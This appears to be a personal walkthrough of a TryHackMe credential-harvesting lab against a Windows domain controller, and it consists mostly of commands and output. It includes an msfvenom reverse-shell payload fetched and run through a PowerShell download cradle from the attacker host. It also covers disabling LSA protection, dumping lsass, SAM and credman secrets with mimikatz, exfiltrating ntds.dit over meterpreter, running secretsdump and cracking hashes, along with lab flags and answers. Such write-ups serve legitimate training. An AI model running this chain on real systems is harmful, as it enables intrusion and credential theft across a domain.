---
tags:
  - AD
  - THM
  - Pentesting
  - Credentials
  - CredHarvesting
  - History
  - Windows
  - regedit
---
# Credentials Harvesting

|          |               |
| -------- | ------------- |
| IP       | 10.10.220.216 |
| Username |  thm          |
| Password |  Passw0rd!    |

```bash
ip a s tun0

export IP="10.10.226.188"
export user=thm
export pass=Passw0rd!

ping -c4 $IP

xfreerdp /v:$IP /u:$user /p:$pass /cert:ignore /bpp:16 /gfx-h264 -wallpaper -themes -fonts -f
```

```bash
sudo nmap -T4 -p- $IP -oA initial_nmap
```

```plain
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-18 16:56 EDT
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 48.51% done; ETC: 16:57 (0:00:56 remaining)
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.18% done; ETC: 16:57 (0:00:41 remaining)
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 63.62% done; ETC: 16:57 (0:00:37 remaining)
Nmap scan report for 10.10.226.188
Host is up (0.038s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49667/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49698/tcp open  unknown
59042/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 89.03 seconds
```

## Task 3

`WIN` + `X`  `A` --> `Windows PowerShell (Admin)` `

## Credential Access

### PS user #History

```powershell
type C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### #regedit

```powershell
# OR
reg query HKLM /f password /t REG_SZ /s
# OR
reg query HKCU /f password /t REG_SZ /s
```

### #AD

```powershell
# Searching for the "password" keyword in the Registry

Get-ADUser -Filter {Description -like "*password*"} -Properties * | Select-Object DistinguishedName, SamAccountName, Description

Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties * | Select-Object DistinguishedName, SamAccountName, Description
```

Answer 1:
> `reg query HKLM /f flag /t REG_SZ /s`  > 7tyh4ckm3

Answer 2:
> `Get-ADUser -Filter {Description -like "*password*"} -Properties * | Select-Object DistinguishedName, SamAccountName, Description` > Passw0rd!@#

## Task 4

Disconnect or minimize the RDP Session.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f psh -o shell.ps1

sudo python -m http.server 80
```

```bash
export IP="10.10.226.188"
export user=thm
export pass=Passw0rd!

xfreerdp /v:$IP /u:$user /p:$pass /cert:ignore /bpp:16 /gfx-h264 -wallpaper -themes -fonts
```

```bash
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; exploit"
```

```powershell
# RDP Session
iex(New-Object Net.WebClient).DownloadString('http://10.14.39.150/shell.ps1')
```

```bash
meterpreter > ps | grep "spool"
Filtering on 'spool'

Process List
============

 PID   PPID  Name        Arch  Session  User              Path
 ---   ----  ----        ----  -------  ----              ----
 2756  800   spoolsv.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
             e                          TEM               32\spoolsv.exe

meterpreter > migrate 2756
[*] Migrating from 760 to 2756...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > getprivs
Enabled Process Privileges
==========================
Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeTcbPrivilege
meterpreter > use kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > kiwi_cmd lsadump::sam
Domain : CREDS-HARVESTIN
SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
Local SID : S-1-5-21-3834733639-2659293967-483594348

SAMKey : a1ac4e5187056d5cebc96d9f268e206d

RID  : 000001f4 (500)
User : Administrator
    Hash NTLM: 98d3a787a80d08385cea7fb4aa2a4261

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
```

> 98d3a787a80d08385cea7fb4aa2a4261

## Task 5

`WIN` + `X` + `A`

```powershell
PS C:\Windows\system32> cd C:\Tools\Mimikatz\
PS C:\Tools\Mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

`WIN` + `R` > `regedit`

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`

`RunAsPPL` --> 0

![[images/Pasted image 20240618222449.png]]

```powershell
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 824 -> 00/00 [0-0-0]

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 809031 (00000000:000c5847)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 6/18/2024 3:48:03 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
```

Answer 1:
> Y

## Task 6

```powershell
PS C:\Users\thm> vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\thm\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\thm\AppData\Local\Microsoft\Vault

PS C:\Users\thm> VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\thm\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI
PS C:\Users\thm> VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMuser
Saved By: MSEdge
Hidden: No
Roaming: Yes

PS C:\Users\thm> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\thm> Get-WebCredentials

UserName Resource             Password     Properties
-------- --------             --------     ----------
THMuser  internal-app.thm.red E4syPassw0rd {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}

PS C:\Users\thm> cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=10.10.237.226
    Type: Generic
    User: thm

    Target: Domain:interactive=thm.red\thm-local
    Type: Domain Password
    User: thm.red\thm-local

PS C:\Users\thm> runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...
```

```powershell
PS C:\Users\thm> cd C:\Tools\Mimikatz\
PS C:\Tools\Mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

# { SNIP }

Authentication Id : 0 ; 809031 (00000000:000c5847)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 6/18/2024 3:48:03 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
# { SNIP }
```

```cmd
# THM.red

type "C:\Users\thm-local\Saved Games\flag.txt"
THM{RunA5S4veCr3ds}

```

Answer 1:
>E4syPassw0rd

Answer 2:
>jfxKruLkkxoPjwe3

Answer 3:
>THM{RunA5S4veCr3ds}

## Task 7

```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

I reuse my open meterpreter reverse shell to download the files

```bash
meterpreter > cd C:\\TEMP
meterpreter > ls
Listing: C:\TEMP
================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2024-06-18 16:49:01 -0400  Active Directory
040777/rwxrwxrwx  0     dir   2024-06-18 16:49:06 -0400  registry

meterpreter > download Active\ Directory\\
[*] downloading: Active Directory\\ntds.dit -> /home/censored/ntds.dit
[*] Completed  : Active Directory\\ntds.dit -> /home/censored/ntds.dit
[*] downloading: Active Directory\\ntds.jfm -> /home/censored/ntds.jfm
[*] Completed  : Active Directory\\ntds.jfm -> /home/censored/ntds.jfm
meterpreter > download registry\\
[*] downloading: registry\\SECURITY -> /home/censored/SECURITY
[*] Completed  : registry\\SECURITY -> /home/censored/SECURITY
[*] downloading: registry\\SYSTEM -> /home/censored/SYSTEM
[*] Completed  : registry\\SYSTEM -> /home/censored/SYSTEM

```

```bash
impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local | tee -a hashes.txt

impacket-secretsdump -just-dc THM.red/thm@$IP | tee -a hashes.ad.txt

cat hashes.txt | grep -i boot

cat hashes.txt | grep bk-admin > bk-admin.hash.txt

hashcat -m 1000 -a 0 bk-admin.hash.txt /opt/wordlists/rockyou.txt

hashcat bk-admin.hash.txt --show -m 1000
```

Answer 1:
> 0x36c8d26ec0df8b23ce63bcefa6e2d821

Answer 2:
>Passw0rd123

## Task 8

```powershell
dir "C:\Program Files\LAPS\CSE"

Get-Command *AdmPwd*

Find-AdmPwdExtendedRights -Identity THMorg

net user bk-admin

net groups LAPsReader

Get-AdmPwdPassword -ComputerName creds-harvestin
```

Answer 1:
>LAPsReader

Answer 2:
>THMLAPSPassw0rd

Answer 3:
>bk-admin

## Task 9

Based on Task 7 ... svc looks familiar

```bash
cat hashes.txt | grep -i svc > svc.hash.txt

hashcat -m 1000 -a 0 bk-admin.hash.txt /opt/wordlists/rockyou.txt

hashcat svc.hash.txt --show -m 1000
```

Answer 1:
> svc-thm

Answer 2:
> Passw0rd1
